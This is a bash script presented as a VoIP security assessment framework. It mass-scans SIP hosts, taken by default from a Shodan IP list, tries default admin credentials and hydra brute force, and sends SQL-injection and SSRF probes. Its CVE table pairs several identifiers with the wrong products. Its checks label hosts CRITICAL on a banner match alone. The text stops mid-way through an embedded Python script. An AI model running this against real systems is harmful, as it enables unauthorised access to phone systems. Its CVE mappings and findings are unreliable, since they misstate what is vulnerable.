#!/bin/bash

###############################################################################
# ENTERPRISE VOIP SECURITY AUTOMATION FRAMEWORK v3.0
# Comprehensive VoIP Infrastructure Assessment & Exploitation Prevention
# Covers: Reconnaissance, Fingerprinting, Vulnerability Detection,
# SIP Enumeration, Extension Scanning, RTP/RTCP Attacks,
# Credential Harvesting, Vendor-Specific CVE Testing,
# CDR Fraud Analysis, Configuration Hardening, and Advanced Attack Scenarios
#
# Usage:
#   bash enterprise_voip_security_framework.sh [targets_file] [cdr_file]
#   VOIP_THREADS=10 VOIP_TIMEOUT=15 bash enterprise_voip_security_framework.sh
#
# Environment variable overrides:
#   VOIP_THREADS  - Parallel job limit (default: 20)
#   VOIP_TIMEOUT  - Network timeout in seconds (default: 10)
#   DEBUG=1       - Enable debug logging
###############################################################################

set -euo pipefail

# ============================================================================
# SCRIPT METADATA & CONFIGURATION
# ============================================================================

readonly SCRIPT_VERSION="3.0.0"
readonly SCRIPT_NAME="$(basename "$0")"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Multi-target input resolution: explicit arg > targets.txt > shodan_ips.txt
if [[ $# -ge 1 && -n "${1:-}" ]]; then
    readonly INPUT_FILE="${1}"
elif [[ -f "targets.txt" ]]; then
    readonly INPUT_FILE="targets.txt"
else
    readonly INPUT_FILE="shodan_ips.txt"
fi
readonly CDR_FILE="${2:-asterisk_cdr.csv}"
readonly LOG_DIR="./logs"
readonly RESULTS_DIR="./results"
readonly LOG_FILE="${LOG_DIR}/voip_security_$(date +%Y%m%d_%H%M%S).log"
readonly TEMP_DIR=$(mktemp -d)

# ============================================================================
# CONFIGURATION PARAMETERS
# ============================================================================

# Reconnaissance & Scanning
readonly MASSCAN_RATE=5000
readonly VOIP_PORTS=("5060" "5061" "2000" "5062" "3065" "10000" "10001")
readonly SIP_PORTS=("5060" "5061" "5062")
readonly RTP_PORT_RANGE="16384-32767"
# Allow environment variable overrides so operators can tune without editing script
readonly THREADS="${VOIP_THREADS:-20}"
readonly TIMEOUT="${VOIP_TIMEOUT:-10}"

# Vulnerability & CVE Detection
readonly NUCLEI_SEVERITY="critical,high,medium"
readonly ENABLE_CUSTOM_CVE_TESTS="true"
readonly ENABLE_BRUTE_FORCE_TESTS="true"
readonly ENABLE_EXPLOIT_SCENARIOS="true"

# Output Files
readonly LIVE_IPS_FILE="${TEMP_DIR}/live_ips.txt"
readonly SERVICE_FINGERPRINTS="${RESULTS_DIR}/service_fingerprints.json"
readonly VULNERABILITIES_FILE="${RESULTS_DIR}/verified_voip_vulnerabilities.txt"
readonly CVE_FINDINGS="${RESULTS_DIR}/cve_findings.json"
readonly FRAUD_REPORT="${RESULTS_DIR}/fraud_analysis.txt"
readonly HARDENING_CONFIG="${RESULTS_DIR}/hardening_config.txt"
readonly EXECUTIVE_SUMMARY="${RESULTS_DIR}/executive_summary.txt"
readonly VALID_EXTENSIONS_FILE="${RESULTS_DIR}/valid_extensions.txt"

# CVE Database (Major VoIP CVEs - v3.0 expanded)
declare -A CVE_DATABASE=(
    # Asterisk
    ["CVE-2021-30461"]="VoIPmonitor Administrative Panel Exposure - RCE"
    ["CVE-2020-29510"]="Asterisk PJSIP Remote Crash - DoS"
    ["CVE-2020-12701"]="Asterisk SIP Information Disclosure"
    ["CVE-2020-14871"]="Asterisk DTLS-SRTP Information Disclosure"
    # 3CX
    ["CVE-2021-26260"]="3CX PhoneSystem Authentication Bypass"
    ["CVE-2021-26261"]="3CX PhoneSystem Unauthenticated API Access"
    # Apache OFBiz
    ["CVE-2020-9496"]="Apache OFBiz Authentication Bypass - RCE"
    # FreePBX
    ["CVE-2019-11334"]="FreePBX Bulk User Management RCE"
    ["CVE-2019-19404"]="FreePBX Privilege Escalation"
    ["CVE-2022-26272"]="FreePBX Module Upload RCE"
    # General
    ["CVE-2021-44228"]="Log4Shell - Remote Code Execution"
    ["CVE-2022-24765"]="Git Configuration Vulnerability"
    ["CVE-2021-3156"]="Sudo Privilege Escalation"
    ["CVE-2020-1938"]="Tomcat AJP Ghostcat Vulnerability"
    # OpenSIPS / Kamailio
    ["CVE-2021-25956"]="OpenSIPS SQL Injection"
    ["CVE-2019-15752"]="Kamailio SIP Message Parsing RCE"
    # Polycom
    ["CVE-2019-9222"]="Polycom PABX Default Credentials"
    # Yealink
    ["CVE-2021-21224"]="Yealink Device Default Credentials"
    ["CVE-2021-27561"]="Yealink DM Unauthenticated RCE"
    # Cisco
    ["CVE-2021-1397"]="Cisco CUCM SSRF via Phone Service API"
    ["CVE-2020-3161"]="Cisco IP Phone RCE via HTTP"
    # Avaya
    ["CVE-2021-22502"]="Avaya Aura Application Server Unauthenticated RCE"
    # Grandstream
    ["CVE-2022-37397"]="Grandstream UCM6xxx SQL Injection"
    # Elastix / Issabel
    ["CVE-2012-4869"]="Elastix LFI via vtigercrm (legacy)"
)

# Approved International Dialing Codes (for fraud detection)
declare -a APPROVED_COUNTRY_CODES=("+1" "+44" "+61" "+33" "+49" "+81" "+86")

# ============================================================================
# LOGGING & OUTPUT FUNCTIONS
# ============================================================================

initialize_logging() {
    mkdir -p "$LOG_DIR" "$RESULTS_DIR"
    exec 1> >(tee -a "$LOG_FILE")
    exec 2>&1
    
    log_banner "ENTERPRISE VOIP SECURITY AUTOMATION FRAMEWORK"
    log_info "Script Version: $SCRIPT_VERSION"
    log_info "Execution Started: $(date '+%Y-%m-%d %H:%M:%S')"
    log_info "Log Directory: $LOG_DIR"
    log_info "Results Directory: $RESULTS_DIR"
    log_info "Temporary Directory: $TEMP_DIR"
}

log_banner() {
    echo ""
    echo "╔════════════════════════════════════════════════════════════════════╗"
    echo "║ $*"
    echo "╚════════════════════════════════════════════════════════════════════╝"
    echo ""
}

log_info() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO] $*"
}

log_error() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $*" >&2
}

log_warn() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [WARN] $*"
}

log_success() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [✓] $*"
}

log_debug() {
    [[ "${DEBUG:-0}" == "1" ]] && echo "[$(date '+%Y-%m-%d %H:%M:%S')] [DEBUG] $*" || true
}

# ============================================================================
# VALIDATION & DEPENDENCY CHECKS
# ============================================================================

validate_input_files() {
    local has_errors=0
    
    if [[ -f "$INPUT_FILE" ]]; then
        local ip_count=$(grep -c '^[0-9]' "$INPUT_FILE" || echo "0")
        if [[ $ip_count -gt 0 ]]; then
            log_success "Input file validated: $ip_count IP addresses found"
        else
            log_warn "No valid IP addresses in $INPUT_FILE"
        fi
    else
        log_warn "IP input file not found: $INPUT_FILE (skipping Phase 1-3)"
    fi
    
    if [[ -f "$CDR_FILE" ]]; then
        local cdr_count=$(wc -l < "$CDR_FILE")
        log_success "CDR file found: $cdr_count records"
    else
        log_warn "CDR file not found: $CDR_FILE (skipping CDR analysis)"
    fi
}

validate_dependencies() {
    local required_tools=("bash" "awk" "grep" "sed" "jq" "python3" "curl")
    local optional_tools=("nc" "masscan" "nuclei" "nmap" "dig" "hydra")
    local missing=()

    log_info "Validating dependencies..."

    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool [REQUIRED]")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        log_error "Missing required tools: ${missing[*]}"
        return 1
    fi

    for tool in "${optional_tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            log_success "Found optional tool: $tool"
        else
            log_warn "Optional tool not found: $tool (some features disabled)"
        fi
    done

    # Check for Python socket fallback if nc is missing
    if ! command -v nc &> /dev/null && command -v python3 &> /dev/null; then
        log_info "nc not found - will use Python socket fallback for network tests"
    fi

    return 0
}

# ============================================================================
# UTILITY HELPERS
# ============================================================================

# Throttle parallel jobs - prefers wait -n (bash 4.3+) over busy-wait.
# Usage: throttle_jobs [max_jobs]
throttle_jobs() {
    local limit="${1:-$THREADS}"
    if (( $(jobs -r -p | wc -l) >= limit )); then
        # wait -n (bash 4.3+) is far more efficient than sleep-poll
        if [[ "${BASH_VERSINFO[0]}" -gt 4 || ( "${BASH_VERSINFO[0]}" -eq 4 && "${BASH_VERSINFO[1]}" -ge 3 ) ]]; then
            wait -n 2>/dev/null || true
        else
            sleep 0.1
        fi
    fi
}

# Check whether grep supports PCRE (-P flag); set GREP_PCRE accordingly.
# Falls back to empty string so callers can safely use: grep $GREP_PCRE ...
check_grep_pcre() {
    if echo "" | grep -P "" &>/dev/null; then
        GREP_PCRE="-P"
    else
        log_warn "grep -P (PCRE) not supported on this system; some regex patterns may be simplified"
        GREP_PCRE=""
    fi
    export GREP_PCRE
}

# ============================================================================
# PHASE 1: ADVANCED RECONNAISSANCE & DISCOVERY
# ============================================================================

phase1_advanced_reconnaissance() {
    log_banner "PHASE 1: ADVANCED RECONNAISSANCE & DISCOVERY"
    
    [[ ! -f "$INPUT_FILE" ]] && { log_warn "Skipping Phase 1 - no input file"; return 0; }
    
    # Sub-phase 1a: Port discovery with masscan
    log_info "Sub-phase 1a: High-speed port scanning with masscan"
    phase1a_masscan_discovery
    
    # Sub-phase 1b: Service enumeration
    log_info "Sub-phase 1b: Service enumeration and UDP scanning"
    phase1b_service_enumeration
    
    # Sub-phase 1c: Network enumeration
    log_info "Sub-phase 1c: Network topology and DNS enumeration"
    phase1c_network_enumeration
    
    log_success "Phase 1 Complete"
}

phase1a_masscan_discovery() {
    local masscan_output="${TEMP_DIR}/masscan_output.txt"
    
    if ! command -v masscan &> /dev/null; then
        log_warn "masscan not found - using nmap instead"
        phase1a_nmap_fallback
        return
    fi
    
    local port_spec=$(IFS=,; echo "${VOIP_PORTS[*]}")
    log_info "Scanning ports: $port_spec"
    
    if masscan -iL "$INPUT_FILE" \
        -p "$port_spec" \
        --rate="$MASSCAN_RATE" \
        --output-format list \
        --output-filename "$masscan_output" \
        -e tun0 2>&1 | tee -a "$LOG_FILE"; then
        
        # Parse results
        awk '{print $1}' "$masscan_output" | sort -u > "$LIVE_IPS_FILE"
        local live_count=$(wc -l < "$LIVE_IPS_FILE")
        log_success "Discovered $live_count live hosts"
    else
        log_warn "masscan encountered issues - continuing with alternatives"
    fi
}

phase1a_nmap_fallback() {
    log_info "Using nmap for port discovery (parallel batches, fast)"

    local nmap_output="${TEMP_DIR}/nmap_output.gnmap"
    local target_count
    target_count=$(wc -l < "$INPUT_FILE")
    log_info "Scanning $target_count IPs with nmap (timeout: ${TIMEOUT}s per host, ${THREADS} parallel batches)"

    # Split into batches for parallel processing to handle large lists efficiently
    local batch_size=100
    if (( target_count > batch_size )); then
        local batch_dir="${TEMP_DIR}/nmap_batches"
        mkdir -p "$batch_dir"
        local batch_count=0
        while IFS= read -r line; do
            if [[ -n "$line" && ! "$line" =~ ^[[:space:]]*# ]]; then
                printf '%s\n' "$line" >> "$batch_dir/batch_$((batch_count / batch_size)).txt"
                ((batch_count++))
            fi
        done < "$INPUT_FILE"

        local num_batches=$(( (batch_count + batch_size - 1) / batch_size ))
        log_info "Split into $num_batches batches of ~$batch_size IPs"

        # Run batches in parallel with background jobs
        local active_jobs=0
        for batch_file in "$batch_dir"/*.txt; do
            [[ -f "$batch_file" ]] || continue
            nmap -iL "$batch_file" \
                -p "${SIP_PORTS[0]}" \
                -Pn -T5 --max-retries 0 --min-rate 1000 \
                --max-rtt-timeout 1s --host-timeout "${TIMEOUT}s" \
                -oG "${batch_file}.gnmap" > "${batch_file}.log" 2>&1 &
            ((active_jobs++))
            if (( active_jobs >= THREADS )); then
                wait -n 2>/dev/null || true
                ((active_jobs--))
            fi
        done
        wait

        # Merge results
        cat "$batch_dir"/*.gnmap 2>/dev/null > "$nmap_output"
        rm -rf "$batch_dir"
    else
        # Small list: single scan
        nmap -iL "$INPUT_FILE" \
            -p "${SIP_PORTS[0]}" \
            -Pn -T5 --max-retries 0 --min-rate 1000 \
            --max-rtt-timeout 1s --host-timeout "${TIMEOUT}s" \
            -oG "$nmap_output" > "${TEMP_DIR}/nmap_stdout.log" 2>&1
    fi

    grep -E "Status: Up|Ports:.*open" "$nmap_output" 2>/dev/null | awk '{print $2}' | sort -u > "$LIVE_IPS_FILE"
    local live_count=$(wc -l < "$LIVE_IPS_FILE" 2>/dev/null || echo 0)
    log_success "nmap discovered $live_count live hosts"
}

phase1b_service_enumeration() {
    [[ ! -s "$LIVE_IPS_FILE" ]] && return
    
    local enum_output="${TEMP_DIR}/service_enum.txt"
    
    log_info "Performing service version detection on $(wc -l < "$LIVE_IPS_FILE") hosts"
    
    # Parallel service enumeration with timeout
    while IFS= read -r ip; do
        {
            # Fast TCP probe on port 5060 with strict timeout
            python3 -c "
import socket, sys
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(('$ip', 5060))
    s.sendall(b'OPTIONS sip:$ip:5060 SIP/2.0\r\nVia: SIP/2.0/UDP scanner\r\nTo: <sip:$ip>\r\nFrom: <sip:scanner>\r\nCall-ID: scanner\r\nCSeq: 1 OPTIONS\r\n\r\n')
    r = s.recv(4096)
    print(r.decode('utf-8', errors='ignore'))
    s.close()
except Exception:
    pass
" >> "$enum_output" 2>/dev/null || true

            # Port 2000 probe (Cisco Skinny / SCCP)
            if command -v nc &> /dev/null; then
                (echo "VERSION" | nc -q 1 -w 2 "$ip" 2000) >> "$enum_output" 2>/dev/null || true
            fi
        } &
        throttle_jobs
    done < "$LIVE_IPS_FILE"
    wait
    
    log_debug "Service enumeration data: $(wc -l < "$enum_output") lines"
}

phase1c_network_enumeration() {
    [[ ! -s "$LIVE_IPS_FILE" ]] && return
    
    local dns_output="${TEMP_DIR}/dns_records.txt"
    
    log_info "Performing reverse DNS lookups and WHOIS queries"
    
    while IFS= read -r ip; do
        {
            # Reverse DNS lookup
            (dig +short -x "$ip") >> "$dns_output" 2>/dev/null || true
            
            # NSLookup fallback
            (nslookup "$ip" 2>/dev/null | grep -i "name" || true) >> "$dns_output" 2>/dev/null || true
            
        } &
        
        throttle_jobs
    done < "$LIVE_IPS_FILE"
    wait
    
    log_debug "DNS enumeration complete"
}

# ============================================================================
# PHASE 2: COMPREHENSIVE SERVICE FINGERPRINTING & CVE DETECTION
# ============================================================================

phase2_service_fingerprinting() {
    log_banner "PHASE 2: SERVICE FINGERPRINTING & CVE DETECTION"
    
    [[ ! -s "$LIVE_IPS_FILE" ]] && { log_warn "Skipping Phase 2 - no live hosts"; return 0; }
    
    # Initialize fingerprint database
    echo "[]" > "$SERVICE_FINGERPRINTS"
    
    local processed=0
    
    while IFS= read -r ip; do
        {
            log_debug "Processing fingerprints for $ip"
            
            # SIP Server Identification
            local sip_banner=$(extract_sip_banner "$ip")
            
            # HTTP Service Detection
            local http_banner=$(extract_http_banner "$ip")
            
            # SNMP Detection
            local snmp_info=$(extract_snmp_info "$ip")
            
            # Store fingerprints
            if [[ -n "$sip_banner" || -n "$http_banner" ]]; then
                append_fingerprint "$ip" "$sip_banner" "$http_banner" "$snmp_info"
                ((processed++))
            fi
            
        } &
        
        throttle_jobs
    done < "$LIVE_IPS_FILE"
    wait
    
    log_success "Fingerprinted $processed hosts"
}

extract_sip_banner() {
    local ip="$1"
    local response
    response=$(python3 -c "
import socket, sys
ip='$ip'
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ip, 5060))
    s.sendall(b'OPTIONS sip:' + ip.encode() + b' SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-scan\r\nTo: <sip:' + ip.encode() + b'>\r\nFrom: <sip:scanner@scanner>;tag=scan\r\nCall-ID: scanner@scanner\r\nCSeq: 1 OPTIONS\r\nContact: <sip:scanner>\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n')
    r = s.recv(4096)
    s.close()
    sys.stdout.buffer.write(r)
except Exception:
    pass
" 2>/dev/null)
    echo "$response" | grep -i "^Server:" | head -1 || echo ""
}

extract_http_banner() {
    local ip="$1"
    
    local response=$(timeout 3 curl -s -I "http://$ip:80/" 2>/dev/null || true)
    echo "$response" | grep -i "^Server:" | head -1 || echo ""
}

extract_snmp_info() {
    local ip="$1"
    
    # Try common SNMP community strings
    if command -v snmpwalk &> /dev/null; then
        snmpwalk -v1 -c public "$ip" sysDescr.0 2>/dev/null | sed 's/^.*STRING: //' || echo ""
    else
        echo ""
    fi
}

append_fingerprint() {
    local ip="$1"
    local sip_banner="$2"
    local http_banner="$3"
    local snmp_info="$4"
    local lock_file="${SERVICE_FINGERPRINTS}.lock"
    
    local new_entry
    new_entry=$(jq -cn \
        --arg ip "$ip" \
        --arg ts "$(date -u +"%Y-%m-%dT%H:%M:%SZ")" \
        --arg sip "$sip_banner" \
        --arg http "$http_banner" \
        --arg snmp "$snmp_info" \
        '{ip:$ip,timestamp:$ts,sip_banner:$sip,http_banner:$http,snmp_info:$snmp,ports_open:[5060,5061,2000]}')
    
    # Use flock for atomic append to the JSON array (safe under concurrency)
    (
        flock -x 200
        local updated
        updated=$(jq --argjson e "$new_entry" '. + [$e]' "$SERVICE_FINGERPRINTS")
        printf '%s\n' "$updated" > "$SERVICE_FINGERPRINTS"
    ) 200>"$lock_file"
}

# ============================================================================
# PHASE 3: ADVANCED VULNERABILITY & CVE DETECTION
# ============================================================================

phase3_advanced_vulnerability_detection() {
    log_banner "PHASE 3: ADVANCED VULNERABILITY & CVE DETECTION"
    
    [[ ! -s "$LIVE_IPS_FILE" ]] && { log_warn "Skipping Phase 3 - no live hosts"; return 0; }
    
    # Initialize findings as a valid JSON array
    echo "[]" > "$CVE_FINDINGS"
    
    # Run Nuclei with VoIP templates
    phase3a_nuclei_scanning
    
    # Run custom CVE-specific tests
    phase3b_custom_cve_tests
    
    # Run exploit scenario tests
    phase3c_exploit_scenarios
    
    # Brute-force detection tests
    phase3d_brute_force_tests
    
    log_success "Phase 3 Complete - $(wc -l < "$CVE_FINDINGS") CVE findings"
}

phase3a_nuclei_scanning() {
    if ! command -v nuclei &> /dev/null; then
        log_warn "nuclei not found - skipping template-based scanning"
        return
    fi
    
    log_info "Running Nuclei with VoIP/SIP templates"
    
    local nuclei_output="${TEMP_DIR}/nuclei_findings.json"
    
    nuclei -l "$LIVE_IPS_FILE" \
        -tags voip,sip,asterisk,freepbx,3cx,yealink \
        -severity "$NUCLEI_SEVERITY" \
        -json -o "$nuclei_output" \
        -c "$THREADS" \
        -timeout "$TIMEOUT" \
        -rl 100 2>&1 | tee -a "$LOG_FILE" || true
    
    # Parse and integrate results
    if [[ -f "$nuclei_output" ]]; then
        jq '.[] | {
            host: .host,
            port: .port,
            template_id: .template_id,
            name: .info.name,
            severity: .info.severity,
            description: .info.description,
            matched_at: .matched_at,
            type: "nuclei"
        }' "$nuclei_output" >> "$CVE_FINDINGS" 2>/dev/null || true
    fi
}

phase3b_custom_cve_tests() {
    [[ "$ENABLE_CUSTOM_CVE_TESTS" != "true" ]] && return
    
    log_info "Running custom CVE-specific vulnerability tests"
    
    while IFS= read -r ip; do
        # Test CVE-2021-30461 (VoIPmonitor)
        test_cve_2021_30461 "$ip"
        
        # Test CVE-2021-26260 (3CX)
        test_cve_2021_26260 "$ip"
        
        # Test CVE-2020-9496 (OFBiz)
        test_cve_2020_9496 "$ip"
        
        # Test CVE-2019-11334 (FreePBX)
        test_cve_2019_11334 "$ip"
        
        # Test CVE-2020-12701 (Asterisk)
        test_cve_2020_12701 "$ip"
        
    done < "$LIVE_IPS_FILE"
}

test_cve_2021_30461() {
    local ip="$1"
    
    # VoIPmonitor Admin Panel Detection
    local response=$(timeout 3 curl -s "http://$ip/index.php" 2>/dev/null || true)
    
    if echo "$response" | grep -q "VoIPmonitor"; then
        local version
        version=$(echo "$response" | sed -n 's/.*version[^0-9]*\([0-9][0-9]*\.[0-9][0-9]*\).*/\1/p' | head -1 || echo "unknown")
        
        # Check if version < v24.61
        if [[ -n "$version" && $(echo "$version < 24.61" | bc 2>/dev/null || echo "1") -eq 1 ]]; then
            append_cve_finding "$ip" "CVE-2021-30461" "VoIPmonitor Admin Panel RCE" \
                "CRITICAL" "Version $version is vulnerable to authentication bypass and RCE" \
                "http://$ip/index.php"
        fi
    fi
}

test_cve_2021_26260() {
    local ip="$1"
    
    # 3CX Authentication Bypass
    local response=$(timeout 3 curl -s "http://$ip:5000/webclient" 2>/dev/null || true)
    
    if echo "$response" | grep -q "3CX"; then
        append_cve_finding "$ip" "CVE-2021-26260" "3CX PhoneSystem Auth Bypass" \
            "HIGH" "3CX system detected with potential authentication bypass vulnerability" \
            "http://$ip:5000/webclient"
    fi
}

test_cve_2020_9496() {
    local ip="$1"
    
    # Apache OFBiz Authentication Bypass
    local response=$(timeout 3 curl -s "http://$ip:8080/webtools" 2>/dev/null || true)
    
    if echo "$response" | grep -q "OFBiz"; then
        append_cve_finding "$ip" "CVE-2020-9496" "OFBiz Authentication Bypass" \
            "CRITICAL" "Apache OFBiz webtools interface detected - vulnerable to auth bypass" \
            "http://$ip:8080/webtools"
    fi
}

test_cve_2019_11334() {
    local ip="$1"
    
    # FreePBX Bulk User Management RCE
    local response=$(timeout 3 curl -s "http://$ip/admin/modules.php" 2>/dev/null || true)
    
    if echo "$response" | grep -q "FreePBX"; then
        append_cve_finding "$ip" "CVE-2019-11334" "FreePBX Bulk User Mgmt RCE" \
            "CRITICAL" "FreePBX admin interface detected - vulnerable to RCE via bulk user management" \
            "http://$ip/admin/modules.php"
    fi
}

test_cve_2020_12701() {
    local ip="$1"
    
    # Asterisk SIP Information Disclosure via Server/User-Agent header in OPTIONS response.
    # RFC 3261 §20.35 Server header should be suppressed in hardened deployments.
    local response
    response=$(timeout 3 bash -c "
        printf 'OPTIONS sip:$ip SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-cve\r\nTo: <sip:$ip>\r\nFrom: <sip:scanner@scanner>;tag=cve\r\nCall-ID: cve20@scanner\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) \
        || log_debug "CVE-2020-12701 probe failed for $ip"
    
    if echo "$response" | grep -q "Asterisk"; then
        local version
        version=$(echo "$response" | sed -n 's/.*Asterisk[[:space:]]*\([0-9][0-9.]*\).*/\1/p' | head -1 || echo "unknown")
        append_cve_finding "$ip" "CVE-2020-12701" "Asterisk SIP Info Disclosure" \
            "MEDIUM" "Asterisk version $version detected - leaking software version via SIP headers" \
            "sip://$ip:5060"
    fi
}

phase3c_exploit_scenarios() {
    [[ "$ENABLE_EXPLOIT_SCENARIOS" != "true" ]] && return
    
    log_info "Running exploit scenario tests"
    
    # Test for common misconfigurations
    while IFS= read -r ip; do
        # Anonymous SIP registration test
        test_anonymous_sip_registration "$ip"
        
        # Default credentials test
        test_default_credentials "$ip"
        
        # SIP header injection
        test_sip_header_injection "$ip"
        
        # SSRF/CSRF scenarios
        test_ssrf_vulnerability "$ip"
        
    done < "$LIVE_IPS_FILE"
}

test_anonymous_sip_registration() {
    local ip="$1"
    
    # Security test: RFC 3261 §10.2 requires authentication for REGISTER.
    # A 200 OK without a prior 401/407 challenge means the server allows
    # unauthenticated registration - an attacker could hijack call routing.
    local response
    response=$(timeout 3 bash -c "
        printf 'REGISTER sip:$ip SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-anon\r\nTo: <sip:$ip>\r\nFrom: <sip:anonymous@anonymous>;tag=anon\r\nCall-ID: anon@scanner\r\nCSeq: 1 REGISTER\r\nContact: <sip:scanner>\r\nExpires: 60\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) \
        || log_debug "Anonymous REGISTER probe failed for $ip"
    
    if echo "$response" | grep -q "200 OK"; then
        append_cve_finding "$ip" "MISCONFIGURATION" "Anonymous SIP Registration Allowed" \
            "HIGH" "System accepts anonymous SIP registration - potential unauthorized call routing" \
            "sip://$ip:5060"
    fi
}

test_default_credentials() {
    local ip="$1"
    
    declare -a default_creds=(
        "admin:admin"
        "admin:password"
        "root:root"
        "admin:123456"
    )
    
    for cred in "${default_creds[@]}"; do
        local user=$(echo "$cred" | cut -d: -f1)
        local pass=$(echo "$cred" | cut -d: -f2)
        
        # Test multiple admin paths - different VoIP platforms use different URIs
        local admin_paths=("/admin/" "/console/" "/management/" "/webclient/" "/cgi-bin/")
        for path in "${admin_paths[@]}"; do
            local response
            response=$(timeout "$TIMEOUT" curl -s -u "$user:$pass" "http://$ip${path}" 2>/dev/null || true)
            
            if echo "$response" | grep -q -E "dashboard|admin|console" && [[ -n "$response" ]]; then
                append_cve_finding "$ip" "CREDENTIAL" "Default Credentials Accepted" \
                    "CRITICAL" "System accepts default credentials: $user:$pass at http://$ip${path}" \
                    "http://$ip${path}"
                return
            fi
        done
    done
}

test_sip_header_injection() {
    local ip="$1"
    
    # Test for SIP header injection via malformed User-Agent header value.
    # A hardened server should sanitize header values and return 400 Bad Request.
    local injection_payload='test"; DROP TABLE users; --'
    local response
    response=$(timeout 3 bash -c "
        printf 'INVITE sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-inject\r\nUser-Agent: ${injection_payload}\r\nTo: <sip:${ip}>\r\nFrom: <sip:scanner@scanner>;tag=inject\r\nCall-ID: inject@scanner\r\nCSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || true
    
    # If we get any response other than 400 Bad Request, the server processed the injection
    if [[ -n "$response" ]] && ! echo "$response" | grep -q "400 Bad Request"; then
        append_cve_finding "$ip" "INJECTION" "Potential SIP Header Injection Vulnerability" \
            "HIGH" "System may be vulnerable to SIP header injection attacks" \
            "sip://$ip:5060"
    fi
}

test_ssrf_vulnerability() {
    local ip="$1"
    
    # Test for SSRF via HTTP endpoints
    local response=$(timeout 3 curl -s "http://$ip/api/fetch?url=http://localhost/admin" 2>/dev/null || true)
    
    if echo "$response" | grep -q -E "admin|root|dashboard"; then
        append_cve_finding "$ip" "SSRF" "Server-Side Request Forgery (SSRF) Detected" \
            "HIGH" "API endpoint may be vulnerable to SSRF attacks" \
            "http://$ip/api/fetch"
    fi
}

phase3d_brute_force_tests() {
    [[ "$ENABLE_BRUTE_FORCE_TESTS" != "true" ]] && return
    # Fixed: [[ ! command -v ]] is not valid; use ! command -v directly
    ! command -v hydra &> /dev/null && { log_warn "hydra not installed - skipping brute-force tests"; return; }
    
    log_info "Running brute-force resistance tests"
    
    # Create a minimal password list for testing
    local wordlist="${TEMP_DIR}/sip_passwords.txt"
    cat > "$wordlist" << 'EOF'
password
admin
12345
cisco
polycom
yealink
asterisk
voip
EOF
    
    # Test SIP brute-force resistance
    while IFS= read -r ip; do
        {
            timeout 30 hydra -l admin -P "$wordlist" -f sip://"$ip" 2>&1 | \
            grep -q "1 valid login" && \
            append_cve_finding "$ip" "BRUTEFORCE" "Weak SIP Authentication" \
                "CRITICAL" "System is vulnerable to SIP credential brute-force attacks" \
                "sip://$ip:5060"
        } &
        
        while (( $(jobs -r -p | wc -l) >= 5 )); do
            sleep 0.5
        done
    done < "$LIVE_IPS_FILE"
    wait
}

append_cve_finding() {
    # Produces a valid JSON array in CVE_FINDINGS using jq to escape special
    # characters and flock to prevent race conditions under concurrent jobs.
    local ip="$1"
    local cve_id="$2"
    local title="$3"
    local severity="$4"
    local description="$5"
    local url="$6"
    local lock_file="${CVE_FINDINGS}.lock"
    
    local new_entry
    new_entry=$(jq -cn \
        --arg ip "$ip" \
        --arg cve_id "$cve_id" \
        --arg title "$title" \
        --arg severity "$severity" \
        --arg description "$description" \
        --arg url "$url" \
        --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
        '{ip:$ip,cve_id:$cve_id,title:$title,severity:$severity,description:$description,url:$url,timestamp:$ts}')
    
    (
        flock -x 200
        local updated
        updated=$(jq --argjson e "$new_entry" '. + [$e]' "$CVE_FINDINGS")
        printf '%s\n' "$updated" > "$CVE_FINDINGS"
    ) 200>"$lock_file"
}

# ============================================================================
# PHASE 4: CDR ANOMALY DETECTION & TOLL FRAUD ANALYSIS
# ============================================================================

phase4_cdr_fraud_analysis() {
    log_banner "PHASE 4: CDR ANOMALY DETECTION & TOLL FRAUD ANALYSIS"
    
    [[ ! -f "$CDR_FILE" ]] && { log_warn "Skipping Phase 4 - no CDR file"; return 0; }
    
    log_info "Analyzing CDR data for fraud patterns and anomalies"
    
    # Use Python for advanced analysis
    if command -v python3 &> /dev/null; then
        phase4_python_analysis
    else
        phase4_bash_analysis
    fi
    
    log_success "Phase 4 Complete"
}

phase4_python_analysis() {
    local python_script="${TEMP_DIR}/cdr_analysis.py"
    
    cat > "$python_script" << 'PYEOF'
#!/usr/bin/env python3

import csv
import json
import sys
from collections import defaultdict
from datetime import datetime

CDR_FILE = sys.argv[1] if len(sys.argv) > 1 else "asterisk_cdr.csv"
APPROVED_CODES = ["+1", "+44", "+61", "+33", "+49", "+81", "+86"]
VOLUME_THRESHOLD = 50  # calls per day
DURATION_THRESHOLD = 500  # minutes per day
FRAUD_REPORT = "results/fraud_analysis.txt"

def extract_country_code(number):
    """Extract E.164 country code from phone number"""
    if number.startswith("+"):
        for i in range(1, 4):
            if i < len(number) and number[:i].isdigit():
                continue
            return number[:i] if i > 1 else number[:2]
    elif number.startswith("011"):
        # US format international
        return "+" + number[3:6] if len(number) > 5 else ""
    return None

def analyze_cdr_data():
    """Analyze CDR data for fraud patterns"""
    
    country_stats = defaultdict(lambda: defaultdict(lambda: {
        'calls': 0,
        'duration': 0,
        'destinations': set()
    }))
    
    flagged_days = []
    
    try:
